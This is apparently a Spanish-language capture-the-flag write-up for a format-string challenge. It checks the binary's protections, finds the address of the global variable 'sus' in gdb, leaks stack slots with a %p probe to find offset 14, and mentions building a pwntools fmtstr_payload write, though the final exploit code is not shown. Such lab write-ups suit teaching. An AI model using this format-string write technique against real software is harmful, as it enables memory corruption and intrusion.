Okay tenemos un codigo en C. A primera instancia vemos una variable global ¨sus¨, para obtener el flag tenemos que
sobreescribir esa variable con el valor de 0x67616c66. Analizamos con checksec si esta el PIE activado y vemos lo
siguiente:

    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

Vemos que no tenemos activada la defensa PIE. Entonces vamos a analizar el binario con gdb y buscamos donde esta
la variable sus en memoria, lo hacemos con el siguiente comando, *x &sus* y tenemos el resultado:

0x404060 <sus>:	0x21737573

Recordemos que estamos trabajando con binarios de 64 bits, entonces la direccion se rellena con 0.

Vamos a construir el payload con la funcion fmtstr_payload() de pwntools, pero primero tenemos que encontrar el offset
para encontrar el primer slot que podamos controlar con el format string. Probamos:

You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
AAAAAAAA%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
Here's your input: AAAAAAAA0x7fffffffd650,(nil),(nil),0xa,0x400,0x7ffff7fc5860,0x7ffff7ffdab0,(nil),(nil),(nil),0x7ffff7ffe2e0,0x1a0c23d,0x7ffff7fc5d78,0x4141414141414141

Como podemos ver, las As estan en el slot 14, entonces el offset es 14.

Escribimos el exploit, y ponemos todas las opciones y documentamos lo que descubrimos. Ejecutamos y tenemos el flag.
